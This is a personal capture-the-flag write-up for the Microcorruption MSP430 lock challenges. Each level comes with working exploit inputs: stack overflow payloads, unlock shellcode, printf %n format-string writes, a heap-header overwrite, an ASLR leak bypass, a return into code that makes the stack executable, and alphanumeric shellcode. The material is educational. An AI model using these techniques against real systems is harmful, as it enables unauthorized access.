# Microcorruption CTF

I had completed the CTF stages through Algiers and then got distracted and started working on other
things.  So I decided to come back and resolve them and then see if I can get farther along.  This
time as I solve I will write up my solution.

## New Orleans

Put a breakpoint in the check_password function.  Saw that the first comparison was pointing at a 
memory location (0x2400) with ASCII data.  Let us try that as a possible solution.

```
~LM4iFg
```

## Sydney

Check password now has a bunch of comparisons in sequence, and the hardcoded values for the
comparison look like they might be ASCII as well...

- 0x448c = @A
- 0x4494 = ^+
- 0x449c = M.
- 0x44a8 = lm

```
@A^+M.lm
```

## Hanoi

I have no idea what the code was actually trying to do, but I found that the global memory buffer
can be overwritten, and that there was a state variable immediately following the buffer that we
could change.

This input is hexadecimal.

```
555555555555555555555555555555557b
```

## Cusco 

Call convention is 1st argument is put in r15, second arg is r14...
16-byte password buffer is put on the stack in login function

Code calls getsn(&buf, 0x30) which will allow a buffer overrun on the stack.  We should be able to 
change return address of login to call unlock_door().

Return address is on stack @ 0x43fe, points to 0x443c, need to change it to 0x4446

```
0102030405060708090a0b0c0d0e0f104644
```

## Reykjavik

So main calls enc(0x2400, 0xf8), we assume enc is for encryption.  I set a break point after this
function completes, and sure enough we got a bunch of stuff at address 0x2400 that we are going to
into on the next call statement.  Raw hex dump...

```
2400:   0b12 0412 0441 2452 3150 e0ff 3b40 2045   .....A$R1P..;@ E
2410:   073c 1b53 8f11 0f12 0312 b012 6424 2152   .<.S........d$!R
2420:   6f4b 4f93 f623 3012 0a00 0312 b012 6424   oKO..#0.......d$
2430:   2152 3012 1f00 3f40 dcff 0f54 0f12 2312   !R0...?@...T..#.
2440:   b012 6424 3150 0600 b490 210a dcff 0520   ..d$1P....!.... 
2450:   3012 7f00 b012 6424 2153 3150 2000 3441   0...d$!S1P .4A
2460:   3b41 3041 1e41 0200 0212 0f4e 8f10 024f   ;A0A.A.....N...O
2470:   32d0 0080 b012 1000 3241 3041 d21a 189a   2.......2A0A....
2480:   22dc 45b9 4279 2d55 858e a4a2 67d7 14ae   ".E.By-U....g...
```

I ran that code through the disassembler built into the CTF (had to strip off the address
characters in front, and the ASCII at the end of each line.  Got the following:
I'm going to mark it up myself as I reverse what it is doing.

```
2400:  0b12           push	r11
       0412           push	r4
       0441           mov	sp, r4
       2452           add	#0x4, r4
       3150 e0ff      add	#0xffe0, sp         // storage for local vars (probably buf[])
       3b40 2045      mov	#0x4520, r11
2410:  073c           jmp	$+0x10
       1b53           inc	r11
       8f11           sxt	r15
       0f12           push	r15
       0312           push	#0x0                // putchar
       b012 6424      call	#0x2464 <INT>
       2152           add	#0x4, sp
2420:  6f4b           mov.b	@r11, r15
       4f93           tst.b	r15
       f623           jnz	$-0x12
       3012 0a00      push	#0xa
       0312           push	#0x0                // putchar
       b012 6424      call	#0x2464 <INT>
2430:  2152           add	#0x4, sp
       3012 1f00      push	#0x1f
       3f40 dcff      mov	#0xffdc, r15
       0f54           add	r4, r15
       0f12           push	r15
       2312           push	#0x2                // gets
2440:  b012 6424      call	#0x2464 <INT>
       3150 0600      add	#0x6, sp
       b490 210a dcff cmp	#0xa21, -0x24(r4)
       0520           jnz	$+0xc
2450:  3012 7f00      push	#0x7f               // unlock
       b012 6424      call	#0x2464l <INT>
       2153           incd	sp
       3150 2000      add	#0x20, sp
       3441           pop	r4
2460:  3b41           pop	r11
       3041           ret
       
2464: <INT>
       1e41 0200      mov	0x2(sp), r14
       0212           push	sr
       0f4e           mov	r14, r15
       8f10           swpb	r15
       024f           mov	r15, sr
       32d0 0080      bis	#0x8000, sr
       b012 1000      call	#0x10 <__trap_interrupt>
       3241           pop	sr
       3041           ret
```

I found a bunch of calls to the same address, looking that that address, it was the familiar INT()
function from previous stages.  I then added comments as to what syscall was being used.  Strangely,
the external module that validates passwords is not present...

Looks like there is a hardcoded comparison.  Set a breakpoint at the comparison instruction and
determine where in the password sequence the 0x0a21 needs to appear to change the comparison l
outcome.  The address in r4 - 0x24 happens to be the start of the user password.

```
210a
```

## Whitehorse

I notice right away that this one is using the syscall 0x7e to unlock the door.  We are going to
need to call syscall 0x7f to unconditionally unlock the door since we don't know password.

Also see right away the buffer that is being read is undersized for the amount of data they are
going to allow the user to enter.  Can i just create my own shell code in the buffer to unlock the
door and call it by overwriting stacks return address...

Going back to Hanoi challenge, the code to unconditionally unlock door is:

```
4448 <unlock_door>
4448:  3012 7f00      push	#0x7f
444c:  b012 7a45      call	#0x457a <INT>
```

I have to replace the memory address for the INT function, which for this stage is at 0x4532
So my shell code will probably be...

```
30127f00b0123245
```

Beginning of password on stack is at 0x3a84, so make the function return to that address

```
30127f00b01232458090a0b0c0d0e010843a
```

I looked back and saw how I solved this originally, and I had a bit of a unique solution.  My
previous solution was

```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa60447f00
```

Address 0x4460 was a call to the INT() function.  This buffer overrun put the 0x7f instruction
right on the stack and then had the return go directly to the INT() function itself.

## Montevideo

While the password isn't read directly onto the stack at first, it is copied using an unsafe
strcpy.  Only 16 bytes of stack space are reserved.  Put our INT call shell code in the buffer
and then lets have it return to our shell code.

```
30127f00b0124c45090a0b0c0d0e0f10ee43
```

Doh.  The 0x0 in the shell code prevented strcpy from copying the shell code the came afterwords.
I need to rewrite the shell code without 0x0s anywhere. (Or the alternative solution from the
problem before would work well here, but what is the fun in that?)

```
mov #0x108f, r5
sub #0x1010, r5       # r5 = 0x007f
push r5
call #0x454c
```

Using the assembler, I get...

```
35408f10358010100512b0124c45
```

Pad out the rest of the buffer, and then make the return address the start of the buffer (0x43ee).

```
35408f10358010100512b0124c450f10ee43
```

## Johannesburg

Looks like this application still has the ability for us to overrun the buffer that is read in for
the password, but it looks like there is also a check later to determine if the password is longer
then allowed (there is a stack cookie immediately following the buffer).

Lets see if we can get past the stack cookie check...  There is an unlock function that we will
set as the return instruction at 0x4446

```
0102030405060708090a0b0c0d0e0f1011f24644
```

## Santa Cruz

Contents of stack for login():

```
uint16_t unknown;
char username[16];
uint8_t unknown;
uint8_t usernameMinLen = 8;
uint8_t usernameMaxLen = 16;
char password[16];
uint8_t unknown;
uint8_t stackCookie = 0;
```

Looks like there is a check to verify the username length is less than 16 bytes, but the length is
not a constant, it is on the stack as a local variable that we can also overwrite.

Overwriting the stack cookie looks problematic because the strcpy terminate at that spot, and I
need to overwrite the function return.

I think I can overwrite the return address using the username input field.  When I enter the
password, I will then change the stack cookie back to it's expected value.

```
Username
0102030405060708090a0b0c0d0e0f10aa087fb0b1b2b3b4b5b6b7b8b9babbbcbdbebfc0c1c2c3c4c5c64a44

Password
b0b1b2b3b4b5b6b7b8b9babbbcbdbebfc0
```

## Jakarta

login frame size is 0x22
char usernameAndPassword[0x21]

The application tries to use a single buffer for the name and password.  The username can be
0x20 bytes long.  The application then tries to see how much of the buffer is left for the
password and subtracts 0x1f - strlen(username).  That can be -1 (0xffff), which it
erroneously masks later to just 0x01ff when reading the password.

```
Username
0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f20
```

With the username the required length, the call to getsn() to read the password is passed
an erroneous length of 0x1ff.

After the password is strcpy()-ed onto the stack (we we can overwrite tons of stuff), the
application does a strlen(), and will halt if the username and password is longer than 0x21.
The strlen check is a check of a single byte, so we can make the username+password 0x0100
bytes long, the check will pass with the LSB being 0x0.

Only the 0x4c44 matters (the start of the unlock function), the rest is just padding to
get the buffer to overflow the strlen check.

```
111111114c441111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
```

## Addis Ababa

It looks like this level is using printf on a user defined format string.  That will provide an
opportunity for printf vulnerabilities like %n.

Things this broken printf can handle
- %%
- %s
- %x
- %c
- %n

Test password valid will store a flag at the address of the stack pointer (0x345c).  The flag is
0 for invalid passwords, and non-zero on good password.  We need to set that address to something
other than 0x0.

[address 0x345c]%x%n should work

- Start the string with the address we are trying to overwrite
- The first %x prints out the flag we are overwriting (we are just getting printf to skip over
  that parameter and move to the next one
- Then %n writes the current position in the output to the memory location passed into it (which
  we make it is now parsing out of the beginning of our string.

```
5c342578256e
```

## Novosibirsk

Another printf vulnerability.  If we can change the 0x7e system call (that system call will check
the provided password) to a 0x7f (unconditionally unlock door), the door will unlock for us.

0x7f = 127

Address we need to write 0x007f is 44c8

```
c8445555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555256e
```

## Algiers

r10 = address of username = 0x240e = 0x10 byte heap buffer
r11 = address of password = 0x2424 = 0x10 byte heap buffer

getsn(0x30) called to get the username and password

Both are free'd, so we should be able to execute an arbitrary memory overwrite attack.

There are 6 byte headers the heap buffers
- 2 bytes = previous chunk
- 2 bytes = following chunk
- 2 bytes = size shifted over ( lower bit is some sort of flag ).  previous chunk free IIRC?

Heap itself has 8 byte header

Some very rough and ugly notes below as I auditted malloc and free trying to determine how to
exploit them.  I eventually determined that if I overwrote a chunk header, I could use the 
previous chunk address to point to a memory location (-0x04), and the size field to create an
arbitrary value to add to a 16-byte memory location.

Free gets passed memory address to free
sub 6 from pointer to get to the header bytes for the buffer
Move size/flag to r13
Mask off the flag (it is now just 2 x size)
Store the new value back in header (bit must mean the chunk is allocated)
Gets previous block size/header, tests flag byte (must be trying to combine chunks if both free)
If it is zero

Bit is not zero
  Get size/flag of block header of after header
    If not zero
      We add the size of the block after us to our block
      We set the block after us to our own block header (set next to tail of list)s
    If zero

We free r11 first (password), it's header easily overwritten via a long username.

Return pointer on stack is last call.  I'll overwrite it.

Address = 0x439a, point to unlock() which is address 0x4564
Return address was initially 0x4440

password header should be like
 - previous block @ 0x4396
 - next block @ 0x3424
 - size is 0x0119 

I had to really experiment a bunch to figure out what size to make my chunk to get the correct value
written into the return address.

```
Username
0102030405060708090a0b0c0d0e0f10964324341901

Password
01
```

Depending on what stuff was on the stack, you can take different paths for combining or not
combining heap chunks.  I had to tweak the size a bit to get it to work.

## Vladivostok

Where is the main?  I see ASLR named symbols... crap.  After running the code until the point where
it asks for the password, the debugger shows all of the instructions have been overwritten

Original code starts around 0x4400

Trying to copy something to high area of memory (can't overwrite the original code).

Code gets moved to 0x6000-0xcffe (main's r11)
Moved stack pointer to random location
Jumped to aslr_main, then _aslr_main
memcpy(0x1000, 0x4400, 0x7d1e)

aslr_main() called with:
r14 = stack pointer, random location just in front of program code
r15 = program code start

_aslr_main called with r15 = start of program code

To make hacking / debugging easier, at startup, do the following:

```
# Overwrite the memcpy() with a patch to fix the code to where it isn't repositioned at startup
# We are basically saying that the random location it picked to move the code to is the original
# code location
#
# mov #0x4400, r11
# 3b400044

4456 = 403b; 4458 = 4400
```

```
# Where the code originally zero-ed out the original code, don't zero anything out.  The code is
# zero-ed out to prevent us from jumping to known address / code blocks.
#
# nop
# 0343

4494 = 4303; 4496 = 4303
```

Jumps can be relative (forwards or backwards)  too.

jnz $-0xa

Address 0x2402 used as some sort of global variable buffer for priting messages.

Username is allowed to be 8 characters long

Trying to figure out how system calls work...

putchar is a 1 parameter system call.

```
4924 <putchar>
4924:  0e4f           mov	r15, r14
4926:  0d43           clr	r13 // 0, the putchar syscall is 0...
4928:  0d12           push	r13 // typically arg2 or zero (seems like even 0 arg syscalls get 2 args pushed)
492a:  0e12           push	r14 // typically arg1
492c:  0d12           push	r13 // syscall number
492e:  0012           push	pc
4930:  0212           push	sr
4932:  0f4d           mov	r13, r15 // this was the usual syscalls in the past
4934:  8f10           swpb	r15
4936:  024f           mov	r15, sr
4938:  32d0 0080      bis	#0x8000, sr
493c:  b012 1000      call	#0x10
4940:  3241           pop	sr
4942:  3152           add	#0x8, sp
4944:  0f4e           mov	r14, r15
4946:  3041           ret
```

Also determined if I enter a username of
```
U%x %xU
```

It printed out my username as 
```
U0000 476aU
```

0x476a happens to be the address of the start of the printf function.  Could be handy later to
defeat address randomization

Username is read into 0x2426, global static variable, not randomized.

Password is read directly onto stack.  Looks like 8 bytes allocated, immediately following is a
return address we can overwrite. We will overwrite with the return address to the start of the 
_INT(syscall) function.  After the return address, write the sys-call we should use.  It will
appear to the _INT function as a parameter passed on the stack!  Of course we will use the 
unconditional unlock syscall 0x7f.

For non-ASLR code, _INT is at address 0x48ec

This can be computed from username that prints out the address of printf:  
0x48ec - 0x476a + XXXX from username = 0x0182 + xxxx from username
Byteswap the answer

```
Username:
%x %x

Password:
0102030405060708ec4801027f00
```

## Bangalore

Looks like this level has data execution prevention.  

* Paqe 0x00 = executable (interrupt return)
* Page 0x01-0x43 = writeable
* Page 0x44-0xff = executable (application code)

We have a buffer of 0x10 bytes, getsn will allow us to blast away 0x30 bytes of crap.  I assume
this will probably require a ROP exploit.

Not totally sure how ROP works, this is my first ROP rodeo.

I also notice that mark_page_executable pushes things on the stack before calling a syscall.  Can
I create a stack that returns into the middle of that function, and then makes the stack itself
executable, and then return into shell code the unlocks door?

Address of mark_page_executable that is after stack is loaded is 0x44ba

So I'll try to load the buffer up with NOP's for now (we can replace later with shellcode), and
see if we can jump into mark_page_executable and make it look like it's marking page 0x3f (the stack)
as executable, and then return from there to the beginning of the stack!

```
03430343034303430343034303430343ba443f000000ee3f
```

That worked, I started executing my NOPs.  I'll go to earlier exercise to find shellcode to
unconditionally unlock door.

```
bis #0xff00, sr
call #0x10
```

Compiles into less than 16-bytes... whew...

```
32d000ffb0121000
```

So combine shell code, NOPs, and the return code...

```
32d000ffb01210000343034303430343ba443f000000ee3f
```

## Lagos

This next challenge has some code that validates the input text is 0-9, a-z, or A-Z.  We are given
0x200 of buffer to dump on the stack (once it passes validation).

Just for reference:

* 0x30 - 0x39 = Numbers
* 0x41 - 0x5A = Uppercase
* 0x61 - 0x7a = lowercase

My shell code that I used on previous problem is mostly invalid, yeah...

The stack pointer is at 0x43ed.  We can easily put out shell code in at 0x4430 though, and make the
return start us there.

What can we do?

* mov of constants to r0-r9.
* mov data between register r0-r9
* add small numbers to r0-r9? (strange, maybe it becomes shift?)
* decrement r0-r9
* addc.b
* mov.b	@r4, r7 # for any registers pretty much
* pop into r5-9
* ret
* add.b r5,r14
* some jump instructions, must experiment a lot in disassembler

The return instruction is great if I can get the address I want on the stack somehow, but I did
not come up with a reasonable way to do that.

What if we increment the 0x7e in conditional_unlock_door() to a 0x7f, and somehow jump into it...

The address of the 0x7e that we need to increment is at 0x445e.  We can generate a 0x445e by
setting a register to 0x4461, and then decrementing it a bunch.

Can I move the stack pointer to an address, and then pop it to load the value into a register.

### The goal

For Lagos, I found the minimum steps to open a door would be this:

```
r14=7f
pc=4600
```

At first, I was overwriting the return address for the login command, jumping to a later part of
the buffer that could be addressed alpha-numerically

### Construct buffer

This gets me to the return address

```
30313233343536373839414243444546
```

This will overwrite the return address properly:
```
30313233343536373839414243444546473044
```

3x16 bytes of shell garbage
```
303132333435363738394142434445463031323334353637383941424344454630313233343536373839414243444546
```

This gets 7f in r14
```
3031323334353637383941424344454647304430313233343536373839414243444546303132333435363738394142434445463031323334353637383941424344454679503636795049494e49
```

Testing some jump instructions

```
3031323334353637383941424344454647304430313233343536373839414243444546303132333435363738394142434445463031323334353637383941424344454679503636795049494e494634
```

I can only jump 0xee from the current PC.  I need a relative jump of about 0x1c6.  I can just
overwrite more stack till I get closer?  Not sure but I'm about to clobber the current conditional
check code.  So I just added a bunch of NOP crap with the shell code to get 0x7f into r14 and then
jump as far ahead as I can.  Just tweak the number of NOPs until I can finally jump to the 0x4600
code I'm trying to reach.

```
4476537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765376537653765379503636795049494e497634
```

## Chernobyl

Buffer to read data in from user is 0x600 bytes long, the input function called limites the user
data to 0x550 bytes long.  Seems unlikely that we will be able to overwrite the return pointer.

User input starts at 0x3dec.  Ends at 0x433c.
Return pointer is at 0x43f6.  This is 0x60A bytes after the user buffer start point.

After a wrong guess, the application says wrong box, and then asks you to enter a new password.

User is supposed to input the string 'access username password'

Application puts address of 'access' in r14


